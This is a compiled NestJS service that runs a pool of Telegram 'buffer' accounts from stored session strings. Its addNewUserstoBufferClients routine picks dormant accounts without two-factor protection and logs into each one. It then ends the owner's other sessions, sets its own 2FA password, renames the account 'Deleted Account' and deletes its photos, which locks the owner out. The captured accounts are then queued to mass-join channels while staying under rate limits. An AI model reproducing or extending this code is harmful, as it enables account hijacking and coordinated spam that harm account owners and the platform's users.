"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var BufferClientService_1;
Object.defineProperty(exports, "__esModule", { value: true });
exports.BufferClientService = void 0;
const channels_service_1 = require("./../channels/channels.service");
const common_1 = require("@nestjs/common");
const mongoose_1 = require("@nestjs/mongoose");
const mongoose_2 = require("mongoose");
const Telegram_service_1 = require("../Telegram/Telegram.service");
const Helpers_1 = require("telegram/Helpers");
const users_service_1 = require("../users/users.service");
const active_channels_service_1 = require("../active-channels/active-channels.service");
const client_service_1 = require("../clients/client.service");
const promote_client_service_1 = require("../promote-clients/promote-client.service");
const parseError_1 = require("../../utils/parseError");
const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
const logbots_1 = require("../../utils/logbots");
const connection_manager_1 = require("../Telegram/utils/connection-manager");
let BufferClientService = BufferClientService_1 = class BufferClientService {
    constructor(bufferClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, promoteClientService) {
        this.bufferClientModel = bufferClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.promoteClientService = promoteClientService;
        this.logger = new common_1.Logger(BufferClientService_1.name);
        this.joinChannelMap = new Map();
        this.leaveChannelMap = new Map();
        this.isJoinChannelProcessing = false;
        this.isLeaveChannelProcessing = false;
        this.JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000;
        this.LEAVE_CHANNEL_INTERVAL = 60 * 1000;
        this.LEAVE_CHANNEL_BATCH_SIZE = 10;
    }
    async create(bufferClient) {
        const newUser = new this.bufferClientModel(bufferClient);
        return newUser.save();
    }
    async findAll() {
        return this.bufferClientModel.find().exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.bufferClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log("creating");
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);
        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`BufferClient with mobile ${mobile} not found`);
        }
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.bufferClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.bufferClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromBufferMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearBufferMap() {
        console.log("BufferMap cleared");
        this.joinChannelMap.clear();
        this.clearJoinChannelInterval();
    }
    async joinchannelForBufferClients(skipExisting = true) {
        if (!this.telegramService.getActiveClientSetup()) {
            this.logger.log('Starting join channel process');
            await connection_manager_1.connectionManager.disconnectAll();
            this.clearJoinChannelInterval();
            this.clearLeaveChannelInterval();
            await (0, Helpers_1.sleep)(2000);
            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
            const clients = await this.bufferClientModel.find({ channels: { "$lt": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);
            this.logger.debug(`Found ${clients.length} clients to process for joining channels`);
            if (clients.length > 0) {
                for (const document of clients) {
                    try {
                        const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });
                        this.logger.log(`Started joining process for mobile: ${document.mobile}`);
                        const channels = await client.channelInfo(true);
                        this.logger.debug(`Client ${document.mobile} has ${channels.ids.length} existing channels`);
                        await this.update(document.mobile, { channels: channels.ids.length });
                        this.logger.debug(`Client ${document.mobile} has ${channels.canSendFalseChats.length} channels that can't send messages`);
                        let result = [];
                        if (channels.canSendFalseCount < 10) {
                            if (channels.ids.length < 220) {
                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            else {
                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                            }
                            this.logger.debug(`Adding ${result.length} new channels to join queue for ${document.mobile}`);
                            this.joinChannelMap.set(document.mobile, result);
                            this.joinChannelQueue();
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                        else {
                            this.logger.warn(`Client ${document.mobile} has too many restricted channels, moving to leave queue: ${channels.canSendFalseChats.length}`);
                            this.joinChannelMap.delete(document.mobile);
                            this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);
                            this.leaveChannelQueue();
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                    }
                    catch (error) {
                        if (error.message === "SESSION_REVOKED" ||
                            error.message === "AUTH_KEY_UNREGISTERED" ||
                            error.message === "USER_DEACTIVATED" ||
                            error.message === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${document.mobile}, removing client`, error.stack);
                            await this.remove(document.mobile);
                            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        }
                        (0, parseError_1.parseError)(error);
                    }
                }
            }
            this.logger.log(`Join channel process initiated for ${clients.length} clients`);
            return `Initiated Joining channels ${clients.length}`;
        }
        else {
            this.logger.warn('Ignored active check buffer channels as active client setup exists');
        }
    }
    async joinChannelQueue() {
        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {
            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);
            return;
        }
        const existingKeys = Array.from(this.joinChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to join, not starting queue');
            return;
        }
        this.isJoinChannelProcessing = true;
        this.joinChannelIntervalId = setInterval(async () => {
            try {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length === 0) {
                    this.clearJoinChannelInterval();
                    return;
                }
                const processTimeout = setTimeout(() => {
                    this.logger.error('Join channel interval processing timeout');
                    this.clearJoinChannelInterval();
                }, this.JOIN_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing join channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.joinChannelIntervalId}`);
                for (const mobile of keys) {
                    const channels = this.joinChannelMap.get(mobile);
                    if (!channels || channels.length === 0) {
                        this.logger.debug(`No more channels to join for ${mobile}, removing from queue`);
                        this.removeFromBufferMap(mobile);
                        continue;
                    }
                    const channel = channels.shift();
                    this.logger.debug(`${mobile} has ${channels.length} pending channels to join`);
                    this.joinChannelMap.set(mobile, channels);
                    try {
                        await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to join channel: @${channel.username}`);
                        await this.telegramService.tryJoiningChannel(mobile, channel);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} @${channel.username} Outer Err ERR: `, false);
                        this.logger.error(`Error joining channel @${channel.username} for ${mobile}`, errorDetails);
                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                            this.logger.warn(`${mobile} has FloodWaitError or joined too many channels, removing from queue`);
                            this.removeFromBufferMap(mobile);
                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                            await this.update(mobile, { channels: channelsInfo.ids.length });
                        }
                        if (error.errorMessage === "SESSION_REVOKED" ||
                            error.errorMessage === "AUTH_KEY_UNREGISTERED" ||
                            error.errorMessage === "USER_DEACTIVATED" ||
                            error.errorMessage === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            await this.remove(mobile);
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                }
                clearTimeout(processTimeout);
            }
            catch (error) {
                this.logger.error('Error in join channel interval', error.stack);
                this.clearJoinChannelInterval();
            }
        }, this.JOIN_CHANNEL_INTERVAL);
        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            this.logger.debug(`Clearing join channel interval: ${this.joinChannelIntervalId}`);
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            this.isJoinChannelProcessing = false;
            if (this.joinChannelMap.size > 0) {
                setTimeout(() => {
                    this.logger.debug('Triggering next join channel process');
                    this.joinchannelForBufferClients(false);
                }, 30000);
            }
        }
    }
    removeFromLeaveMap(key) {
        this.leaveChannelMap.delete(key);
        if (this.leaveChannelMap.size === 0) {
            this.clearLeaveChannelInterval();
        }
    }
    clearLeaveMap() {
        console.log("LeaveMap cleared");
        this.leaveChannelMap.clear();
        this.clearLeaveChannelInterval();
    }
    async leaveChannelQueue() {
        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {
            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);
            return;
        }
        const existingKeys = Array.from(this.leaveChannelMap.keys());
        if (existingKeys.length === 0) {
            this.logger.debug('No channels to leave, not starting queue');
            return;
        }
        this.isLeaveChannelProcessing = true;
        this.leaveChannelIntervalId = setInterval(async () => {
            try {
                const keys = Array.from(this.leaveChannelMap.keys());
                if (keys.length === 0) {
                    this.logger.debug('Leave map is empty, clearing interval');
                    this.clearLeaveChannelInterval();
                    return;
                }
                const processTimeout = setTimeout(() => {
                    this.logger.error('Leave channel interval processing timeout');
                    this.clearLeaveChannelInterval();
                }, this.LEAVE_CHANNEL_INTERVAL - 1000);
                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);
                for (const mobile of keys) {
                    const channels = this.leaveChannelMap.get(mobile);
                    if (!channels || channels.length === 0) {
                        this.logger.debug(`No more channels to leave for ${mobile}, removing from queue`);
                        this.removeFromLeaveMap(mobile);
                        continue;
                    }
                    const channelsToProcess = channels.splice(0, this.LEAVE_CHANNEL_BATCH_SIZE);
                    this.logger.debug(`${mobile} has ${channels.length} pending channels to leave`);
                    if (channels.length > 0) {
                        this.leaveChannelMap.set(mobile, channels);
                    }
                    else {
                        this.removeFromLeaveMap(mobile);
                    }
                    try {
                        const client = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
                        this.logger.debug(`${mobile} attempting to leave ${channelsToProcess.length} channels`);
                        await client.leaveChannels(channelsToProcess);
                        this.logger.debug(`${mobile} left channels successfully`);
                    }
                    catch (error) {
                        const errorDetails = (0, parseError_1.parseError)(error, `${mobile} Leave Channel ERR: `, false);
                        if (errorDetails.message === "SESSION_REVOKED" ||
                            errorDetails.message === "AUTH_KEY_UNREGISTERED" ||
                            errorDetails.message === "USER_DEACTIVATED" ||
                            errorDetails.message === "USER_DEACTIVATED_BAN") {
                            this.logger.error(`Session invalid for ${mobile}, removing client`);
                            await this.remove(mobile);
                            this.removeFromLeaveMap(mobile);
                        }
                    }
                    finally {
                        await connection_manager_1.connectionManager.unregisterClient(mobile);
                    }
                }
                clearTimeout(processTimeout);
            }
            catch (error) {
                this.logger.error('Error in leave channel interval', error.stack);
                this.clearLeaveChannelInterval();
            }
        }, this.LEAVE_CHANNEL_INTERVAL);
        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);
    }
    clearLeaveChannelInterval() {
        if (this.leaveChannelIntervalId) {
            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);
            clearInterval(this.leaveChannelIntervalId);
            this.leaveChannelIntervalId = null;
        }
        this.isLeaveChannelProcessing = false;
        this.logger.debug('Leave channel interval cleared and processing flag reset');
    }
    async setAsBufferClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('BufferClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {
            try {
                const telegramClient = await connection_manager_1.connectionManager.getClient(mobile, { autoDisconnect: false });
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
            }
            catch (error) {
                const errorDetails = (0, parseError_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, errorDetails.status);
            }
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            return "Client set as buffer successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkBufferClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await connection_manager_1.connectionManager.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            const bufferclients = await this.findAll();
            let goodIds = [];
            const badIds = [];
            if (bufferclients.length < 70) {
                for (let i = 0; i < 70 - bufferclients.length; i++) {
                    badIds.push(i.toString());
                }
            }
            const clients = await this.clientService.findAll();
            const promoteclients = await this.promoteClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile); })];
            const promoteclientIds = promoteclients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of bufferclients) {
                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {
                    try {
                        const cli = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: true, handler: false });
                        const me = await cli.getMe();
                        if (me.username) {
                            await this.telegramService.updateUsername(document.mobile, '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        if (me.firstName !== "Deleted Account") {
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        await this.telegramService.deleteProfilePhotos(document.mobile);
                        const hasPassword = await cli.hasPassword();
                        if (!hasPassword) {
                            console.log("Client does not have password");
                            badIds.push(document.mobile);
                        }
                        else {
                            console.log(document.mobile, " :  ALL Good");
                            goodIds.push(document.mobile);
                        }
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        await (0, Helpers_1.sleep)(2000);
                    }
                    catch (error) {
                        (0, parseError_1.parseError)(error);
                        badIds.push(document.mobile);
                        this.remove(document.mobile);
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                }
                else {
                    console.log("Number is a Active Client");
                    goodIds.push(document.mobile);
                    this.remove(document.mobile);
                }
            }
            goodIds = [...goodIds, ...clientIds, ...promoteclientIds];
            console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
            this.addNewUserstoBufferClients(badIds, goodIds);
        }
        else {
            console.log("ignored active check buffer channels as active client setup exists");
        }
    }
    async addNewUserstoBufferClients(badIds, goodIds) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);
        console.log("New buffer documents to be added: ", documents.length);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await connection_manager_1.connectionManager.getClient(document.mobile, { autoDisconnect: false });
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        await (0, Helpers_1.sleep)(2000);
                        await this.telegramService.removeOtherAuths(document.mobile);
                        const channels = await client.channelInfo(true);
                        console.log("Inserting Document");
                        const bufferClient = {
                            tgId: document.tgId,
                            session: document.session,
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        };
                        await this.create(bufferClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        console.log("=============Created BufferClient=============");
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                        badIds.pop();
                    }
                    else {
                        console.log("Failed to Update as BufferClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                        await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                    }
                }
                catch (error) {
                    (0, parseError_1.parseError)(error);
                    await connection_manager_1.connectionManager.unregisterClient(document.mobile);
                }
            }
            catch (error) {
                (0, parseError_1.parseError)(error);
                console.error("An error occurred:", error);
            }
            await connection_manager_1.connectionManager.unregisterClient(document.mobile);
        }
        setTimeout(() => {
            this.joinchannelForBufferClients();
        }, 2 * 60 * 1000);
    }
};
exports.BufferClientService = BufferClientService;
exports.BufferClientService = BufferClientService = BufferClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        promote_client_service_1.PromoteClientService])
], BufferClientService);
//# sourceMappingURL=buffer-client.service.js.map